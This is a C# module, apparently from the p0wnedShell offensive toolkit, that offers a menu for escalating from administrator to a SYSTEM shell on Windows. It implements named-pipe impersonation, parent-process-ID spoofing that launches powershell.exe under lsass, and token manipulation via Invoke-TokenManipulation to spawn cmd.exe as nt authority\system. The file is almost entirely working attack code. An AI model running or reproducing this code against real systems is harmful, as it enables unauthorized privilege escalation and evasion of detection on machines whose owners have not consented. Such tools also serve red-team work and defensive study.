using System;
using System.Security.Principal;

namespace p0wnedShell
{
    class GetSystem
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Get a SYSTEM shell using EasySystem or Token Manipulation         *"};
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Get a SYSTEM shell using EasySystem (NamedPipe Impersonation).");
            Console.WriteLine();
            Console.WriteLine(" 2. Get a SYSTEM shell using CreateProcess PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.");
            Console.WriteLine();
            Console.WriteLine(" 3. Get a SYSTEM shell using Token Manipulation.");
            Console.WriteLine();
            Console.WriteLine(" 4. Back.");
            Console.Write("\nEnter choice: ");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 4)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        SystemShell();
                    }
                    break;
                case 2:
                    if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        EasySystemPPID();
                    }
                    break;
                case 3:
                    if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        TokenShell();
                    }
                    break;
                default:
                    break;
            }
        }

        public static void SystemShell()
        {
            string[] toPrint = { "* Get a SYSTEM shell using EasySystem (NamedPipe Impersonation)     *" };
            Program.PrintBanner(toPrint);

            EasySystem.EasySystemShell();

            Console.WriteLine("[+] Press Enter to Continue...");
            Console.ReadLine();

            return;
        }

        public static void EasySystemPPID()
        {
            if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] For this function to succeed, you need UAC Elevated Administrator privileges.");
                Console.ResetColor();
                return;
            }

            string szCommandLine = "powershell.exe";

            string PPIDName = "lsass";
            int NewPPID = 0;

            // Find PID from our new Parent and start new Process with new Parent ID
            NewPPID = ProcessCreator.NewParentPID(PPIDName);
            if (NewPPID == 0)
            {
                Console.WriteLine("\n[!] No suitable Process ID Found...");
                return;
            }

            if (!ProcessCreator.CreateProcess(NewPPID, null, szCommandLine))
            {
                Console.WriteLine("\n[!] Oops PPID Spoof failed...");
                return;
            }

            return;
        }

        public static void TokenShell()
        {
            string[] toPrint = { "* Get a SYSTEM shell using Token Manipulation                       *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait for our SYSTEM shell to Popup...\n");
            string SystemShell = "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"";
            try
            {
                P0wnedListener.Execute(SystemShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return;
        }

    }
}